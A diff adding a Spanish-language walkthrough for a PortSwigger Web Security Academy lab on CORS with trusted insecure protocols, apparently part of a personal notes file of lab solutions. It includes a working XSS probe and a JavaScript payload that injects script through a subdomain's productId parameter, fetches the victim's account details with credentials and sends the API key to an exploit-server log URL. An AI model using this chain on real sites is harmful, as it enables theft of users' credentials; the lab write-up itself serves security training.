@@ -727,6 +727,19 @@ Luego de pulsar el botón deliver exploit to victim, debemos ver las respuestas 
      </script>"></iframe>
 ```
 
+### [CORS vulnerability with trusted insecure protocols](https://portswigger.net/web-security/cors/lab-breaking-https-attack)
+
+Al acceder a este laboratorio y autenticarnos, si en la página principal hacemos click en un botón view details, y en el drop-down del fondo de la página seleccionamos algo y hacemos click en Check stock, se nos abrirá una ventana indicando el stock level. Al igual que en los laboratorios anteriores, accediendo a la sección Account Details se puede ver impresa la apikey, y analizando la request y response haciendo uso del repeater de burpsuite, si en origin anteponemos "subdominio." a la url origen de la request, veremos que la respuesta sigue siendo válida.
+Ahora, analizando con el intecept de burpsuite la ventana que se abre al clickear Check Stock mencionada anteriormente, podemos ver que se le envía un parámetro "/?productId=", yendo al decoder de burpsuite y codificando como URL lo siguiente "<img src=1 onerror=alert(1)>", si editamos la petición interceptada y le ponemos como parámetro de productId lo que acabamos de encodear, veremos que se ejecuta el alert que definimos. Por último, observando la url de dicha ventana, veremos que es un subdominio del laboratorio en el que estamos trabajando.
+
+Para resolver el laboratorio, en el siguiente script deberemos pegar la url del mismo, teniendo cuidado en la línea de document.location, ya que en la misma debe ir el subdominio de la ventana que se abre al hacer click en Check stock. La url que debe ir dentro de la función reqListener es la del exploit server.
+
+```javascript
+<script>
+   document.location="http://stock.ac6e1ff21fdb2eaa8059129e00570000.web-security-academy.net/?productId=4<script>var req = new XMLHttpRequest(); req.onload = reqListener; req.open('get','https://ac6e1ff21fdb2eaa8059129e00570000.web-security-academy.net/accountDetails',true); req.withCredentials = true;req.send();function reqListener() {location='https://ac631f561f612e128085127d0143004d.web-security-academy.net/exploit/log?key='%2bthis.responseText; };%3c/script>&storeId=1"
+</script>
+```
+
 ---
 
 ## [XML external entity (XXE) injection](https://portswigger.net/web-security/xxe)
